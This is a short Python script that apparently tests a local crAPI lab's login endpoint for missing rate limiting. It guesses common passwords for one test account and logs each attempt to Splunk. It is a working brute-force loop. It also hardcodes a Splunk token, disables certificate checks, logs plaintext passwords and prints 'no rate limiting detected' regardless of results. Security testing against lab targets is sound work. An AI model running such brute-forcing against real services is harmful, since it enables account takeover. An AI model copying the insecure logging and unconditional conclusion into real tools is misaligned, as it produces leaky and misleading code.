import requests
from datetime import datetime

# --- Splunk HEC config ---
SPLUNK_URL = "https://localhost:8088/services/collector/event"
SPLUNK_TOKEN = "06558f03-251e-43ed-b7b4-44699e9e10fb"

def send_to_splunk(email, password, status, http_code):
    event = {
        "event": {
            "tool": "crapi_brute_force",
            "target": "crAPI identity service",
            "email": email,
            "password": password,
            "status": status,
            "http_code": http_code,
            "timestamp": datetime.utcnow().isoformat()
        },
        "sourcetype": "appsec_api_brute_force",
        "index": "main"
    }
    try:
        requests.post(
            SPLUNK_URL,
            headers={"Authorization": f"Splunk {SPLUNK_TOKEN}"},
            json=event,
            verify=False  # nosemgrep: python.requests.security.disabled-cert-validation
        )
    except Exception as e:
        print(f"[SPLUNK ERROR] {e}")

# --- API brute force logic ---
target = "http://localhost:8888/identity/api/auth/login"
email = "sandeepa@test.com"
passwords = [
    "wrongpassword",
    "123456",
    "admin",
    "letmein",
    "qwerty",
    "Test@1234",
    "welcome",
    "test123"
]

print(f"\nTesting rate limiting on: {target}\n")

for password in passwords:
    response = requests.post(target, json={
        "email": email,
        "password": password
    })

    if response.status_code == 200:
        status = "FOUND"
        print(f"[FOUND]  Password: {password} — Status: {response.status_code}")
    else:
        status = "MISS"
        print(f"[MISS]   Password: {password} — Status: {response.status_code}")

    send_to_splunk(email, password, status, response.status_code)

print("\nScan complete — no rate limiting or lockout detected")